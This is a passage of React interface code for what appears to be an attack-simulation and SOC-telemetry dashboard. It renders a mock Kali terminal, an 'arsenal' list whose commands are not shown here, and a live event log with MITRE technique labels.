              else if (line.type === 'system') textCls = 'text-purple-400';
              else if (line.type === 'muted') textCls = 'text-gray-500';

              return (
                <div key={idx} className={`leading-relaxed whitespace-pre-wrap ${textCls}`}>
                  {line.text}
                </div>
              );
            })}
            <div ref={bottomRef} />
          </div>

          {/* Terminal Input Line */}
          <div className="bg-[#0b0f17] border-t border-[#1f293d] p-3 flex items-center gap-2">
            <span className="text-xs font-mono font-bold text-emerald-400 shrink-0 select-none">
              root@kali:~$
            </span>
            <input
              ref={inputRef}
              value={inputCmd}
              onChange={e => setInputCmd(e.target.value)}
              onKeyDown={handleKeyDown}
              placeholder="type command (e.g. nmap, hydra, sqlmap, help)..."
              className="flex-1 bg-transparent text-xs font-mono text-white placeholder-gray-600 focus:outline-none"
              autoFocus
            />
            <button
              onClick={() => runCommand(inputCmd)}
              className="p-1.5 rounded bg-emerald-600 hover:bg-emerald-500 text-white transition shrink-0"
              title="Execute"
            >
              <CornerDownLeft className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        {/* Right: Pre-Made Offensive Arsenal + Live SOC Telemetry Logs (5 Cols) */}
        <div className="lg:col-span-5 bg-[#111827] border border-[#1f293d] rounded-xl p-4 flex flex-col h-[520px] shadow-xl">
          {/* Right Panel Tabs Header */}
          <div className="flex items-center justify-between border-b border-[#1f293d] pb-2 mb-3">
            <div className="flex items-center gap-1.5 bg-[#0b0f17] p-1 rounded-lg border border-[#1f293d]">
              <button
                onClick={() => setRightPanelTab('arsenal')}
                className={`px-3 py-1 rounded text-xs font-mono font-bold transition flex items-center gap-1.5 ${
                  rightPanelTab === 'arsenal'
                    ? 'bg-purple-600 text-white shadow-xs'
                    : 'text-gray-400 hover:text-gray-200'
                }`}
              >
                <Flame className="w-3.5 h-3.5 text-orange-400" />
                Arsenal ({ATTACK_ARSENAL.length})
              </button>
              <button
                onClick={() => setRightPanelTab('logs')}
                className={`px-3 py-1 rounded text-xs font-mono font-bold transition flex items-center gap-1.5 ${
                  rightPanelTab === 'logs'
                    ? 'bg-cyan-600 text-white shadow-xs'
                    : 'text-gray-400 hover:text-gray-200'
                }`}
              >
                <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
                Live Telemetry Logs ({events.length})
              </button>
            </div>
            <div className="flex items-center gap-2">
              {onOpenCimLogs && (
                <button
                  onClick={onOpenCimLogs}
                  title="Open full CIM Telemetry Logs tab"
                  className="text-[10px] font-mono font-bold text-cyan-400 hover:text-cyan-300 underline flex items-center gap-1"
                >
                  CIM Telemetry (All Logs) &rarr;
                </button>
              )}
              <span className="text-[10px] text-gray-500 font-mono hidden sm:inline">
                {rightPanelTab === 'arsenal' ? '1-Click Execution' : 'Real-Time EDR'}
              </span>
            </div>
          </div>

          {/* Tab 1: Arsenal Items List */}
          {rightPanelTab === 'arsenal' && (
            <div className="flex-1 overflow-y-auto space-y-2 pr-1">
              {ATTACK_ARSENAL.map(atk => (
                <div
                  key={atk.id}
                  className="bg-[#0b0f17] border border-[#1f293d] hover:border-gray-700 rounded-lg p-3 transition space-y-2 group"
                >
                  <div className="flex items-start justify-between gap-2">
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-bold text-white font-mono">{atk.label}</span>
                        <span className="px-1.5 py-0.2 rounded text-[9px] font-mono bg-gray-800 text-gray-400">
                          {atk.category}
                        </span>
                      </div>
                      <p className="text-[11px] text-gray-400 font-sans mt-0.5 line-clamp-1">
                        {atk.desc}
                      </p>
                    </div>

                    <span className="text-[10px] font-mono font-bold text-indigo-400 shrink-0">
                      {atk.mitre}
                    </span>
                  </div>

                  <div className="bg-[#060910] border border-[#1f293d] rounded px-2.5 py-1.5 flex items-center justify-between text-[11px] font-mono text-gray-300">
                    <span className="truncate max-w-[280px]">{atk.cmd}</span>
                    <div className="flex items-center gap-1.5 shrink-0 ml-2">
                      <button
                        onClick={(e) => handleCopyCmd(atk.cmd, e)}
                        className="text-gray-500 hover:text-white transition p-1"
                        title="Copy Command"
                      >
                        {copiedCmd === atk.cmd ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      </button>
                      <button
                        onClick={() => runCommand(atk.cmd)}
                        className="px-2 py-0.5 rounded bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold transition flex items-center gap-1 shadow-sm"
                      >
                        <Play className="w-2.5 h-2.5 fill-current" /> Run
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* Tab 2: Live SOC Telemetry Logs Stream */}
          {rightPanelTab === 'logs' && (
            <div className="flex-1 overflow-y-auto space-y-2 pr-1">
              {events.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-center p-6 text-gray-500 font-mono text-xs space-y-2">
                  <Radio className="w-8 h-8 text-gray-600 animate-pulse" />
                  <span>Waiting for attack telemetry...</span>
                  <span className="text-[10px] text-gray-600">Run an arsenal weapon or playbook on the left to generate live logs.</span>
                </div>
              ) : (
                events.map(evt => {
                  const isLiveAttack = evt.event_uuid?.startsWith('EVT-ATK') || evt.event_uuid?.startsWith('EVT-PBK') || evt.event_uuid?.startsWith('EVT-CLI') || evt.event_uuid?.startsWith('EVT-ING');
                  return (
                    <div
                      key={evt.event_uuid}
                      className={`p-2.5 rounded-lg border font-mono transition text-xs space-y-1.5 ${
                        isLiveAttack
                          ? 'bg-purple-950/40 border-purple-500/60 shadow-md ring-1 ring-purple-500/30'
                          : 'bg-[#0b0f17] border-[#1f293d]'
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2">
                        <div className="flex items-center gap-1.5">
                          <span className={`w-2 h-2 rounded-full ${
                            evt.severity === 'critical' ? 'bg-red-500 animate-pulse' :
                            evt.severity === 'high' ? 'bg-orange-500' :
                            evt.severity === 'medium' ? 'bg-amber-500' : 'bg-blue-500'
                          }`} />
                          <span className="text-[10px] text-gray-400 font-mono">
                            {new Date(evt.timestamp).toLocaleTimeString()}
                          </span>
                          {isLiveAttack && (
                            <span className="px-1.5 py-0.2 rounded text-[8px] font-bold bg-purple-600 text-white animate-pulse">
                              LIVE ATK
                            </span>
                          )}
                        </div>

                        <div className="flex items-center gap-1.5">
                          <span className={`text-[9px] uppercase px-1.5 py-0.2 rounded font-bold ${
                            evt.severity === 'critical' ? 'bg-red-950/60 border border-red-500/40 text-red-400' :
                            evt.severity === 'high' ? 'bg-orange-950/60 border border-orange-500/40 text-orange-400' :
                            'bg-blue-950/60 border border-blue-500/40 text-blue-400'
                          }`}>
                            {evt.severity}
                          </span>
                          <span className="text-[10px] font-bold text-cyan-400">
                            {evt.mitre_technique_id || 'TTP'}
                          </span>
                        </div>
                      </div>

                      <div className="text-white font-bold truncate">
                        {evt.mitre_technique_name || evt.event_type}
                      </div>

                      <div className="text-[11px] text-gray-400 truncate font-mono bg-[#060910] p-1.5 rounded border border-[#1f293d]">
                        {evt.command_line || (evt.cloud_action ? `${evt.cloud_service}::${evt.cloud_action}` : evt.event_type)}
                      </div>

                      <div className="flex items-center justify-between text-[10px] text-gray-500 pt-1">
                        <span className="truncate max-w-[200px]">
                          {evt.source_host || evt.source_ip || 'kali-vm'} &rarr; {evt.dest_host || evt.dest_ip || 'target'}
                        </span>
                        {onSelectEvent && (
                          <button
                            onClick={() => onSelectEvent(evt.event_uuid)}
                            className="px-2 py-0.5 rounded bg-blue-600/30 hover:bg-blue-600/50 text-blue-300 border border-blue-500/40 font-bold transition"
                          >
                            Inspect &rarr;
                          </button>
                        )}
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          )}
        </div>

      </div>
    </div>
  );
}
